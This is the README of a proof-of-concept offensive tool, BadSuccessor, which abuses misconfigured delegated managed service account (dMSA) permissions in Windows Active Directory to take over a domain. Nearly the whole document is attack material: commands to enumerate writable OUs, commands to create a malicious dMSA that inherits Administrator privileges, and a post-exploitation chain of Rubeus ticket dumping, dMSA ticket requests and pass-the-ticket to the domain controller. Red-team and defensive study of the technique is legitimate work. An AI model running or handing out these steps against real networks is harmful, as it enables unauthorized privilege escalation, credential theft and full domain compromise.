# BadSuccessor
A PoC for the dMSA Active Directory Domain Takeover deemed BadSuccessor published by @YuG0rd - Akamai.

Blog Post: [BadSuccessor: Abusing dMSAs for AD Domination](https://kreep.in/badsuccessor-abusing-dmsas-for-ad-domination/)

## Overview
BadSuccessor exploits misconfigured Delegated Managed Service Account (dMSA) permissions in Windows Active Directory to escalate privileges. The tool creates malicious dMSAs that inherit the privileges of high-value service accounts, enabling lateral movement and privilege escalation in modern AD environments.

## Attack Requirements

- User account with write permissions to target OUs
- Windows Server 2025 domain controllers present in the domain (dMSA support required)

## Usage
The tool contains two modules, one to identify exploitable OUs and one to create the dMSA.
```
Usage:
  BadSuccessor find
    Enumerate and list all Organizational Units you have write access to.

  BadSuccessor escalate -targetOU <OU=…,DC=…> -dmsa <name> -targetUser <full DN> [-dc-ip <host>] -dnshostname <hostname> (-machine <name$> | -user <username>)

Examples:
  BadSuccessor find
  BadSuccessor escalate \
    -targetOU "OU=Keep,DC=essos,DC=local" \
    -dmsa kreep_dmsa \
    -targetUser "CN=Administrator,CN=Users,DC=essos,DC=local" \
    -dnshostname kreep_dmsa \
    -machine braavos$ \
    -dc-ip 192.168.10.15

  BadSuccessor escalate \
    -targetOU "OU=Keep,DC=essos,DC=local" \
    -dmsa kreep_dmsa \
    -targetUser "CN=Administrator,CN=Users,DC=essos,DC=local" \
    -dnshostname kreep_dmsa \
    -user john.doe \
    -dc-ip 192.168.10.15

Parameters:
  -targetOU    DN of the OU container (e.g. OU=TestOU,DC=domain,DC=com)
  -dmsa        Name for the new dMSA (sAMAccountName without '$')
  -targetUser  Full DN of the existing service account (e.g. CN=SvcUser,CN=Users,DC=domain,DC=com)
  -dnshostname dNSHostName to give to the new dMSA for Kerberos authentication
  -machine     Machine account for msDS-GroupMSAMembership. Include the $, e.g: braavos$
  -user        User account for msDS-GroupMSAMembership (sAMAccountName without domain)
  -dc-ip       (Optional) FQDN or IP of the DC to bind against for schema-aware writes

Note: You must specify either -machine OR -user, but not both.
```

### Phase 1: Reconnaissance
Identify target OUs where you have write permissions:
```
BadSuccessor.exe find
```
![image](https://github.com/user-attachments/assets/1ee8b241-10a0-4b7b-a1f2-cb8194a9dbc0)

### Phase 2: Exploitation
Create a malicious dMSA to inherit target account privileges:
```
BadSuccessor.exe escalate \
  -targetOU "OU=Servers,DC=corp,DC=local" \
  -dmsa backup_svc \
  -targetUser "CN=BackupAdmin,CN=Users,DC=corp,DC=local" \
  -dnshostname BackupSVR \
  -machine BRAAVOS$ \
  -dc-ip 10.0.1.10
```
![image](https://github.com/user-attachments/assets/3b6fea12-d22d-46f5-a5c0-9100c1f7c061)

## Post-Exploitation Chain
Once the malicious dMSA is created, extract credentials using standard Kerberos attacks:
### 1. Ticket Enumeration
```
# Using Rubeus
Rubeus.exe triage

# Using Kerbeus BOF
krb_triage
```
### 2. TGT Extraction
```
# Rubeus
Rubeus.exe dump /luid:<target_luid> /service:krbtgt /nowrap

# Kerbeus BOF  
krb_dump /luid:<target_luid>
```
### 3. dMSA TGS Request
Requires Rubeus PR #194 for dMSA support
```
Rubeus.exe asktgs /targetuser:<dmsa_name>$ /service:krbtgt/<domain> /dmsa /dc:<dc_fqdn> /opsec /nowrap /ticket:<b64_ticket>
```
### 4. Privileged TGS Request
```
.\Rubeus.exe asktgs /user:<dmsa_name>$ /service:cifs/<dc_fqdn> /opsec /dmsa /nowrap /ptt /ticket:doIF2DCCBdS...
```

## References

- [Akamai: dMSA Attack Research by @YuG0rd](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [Microsoft dMSA Documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-set-up-dmsa)
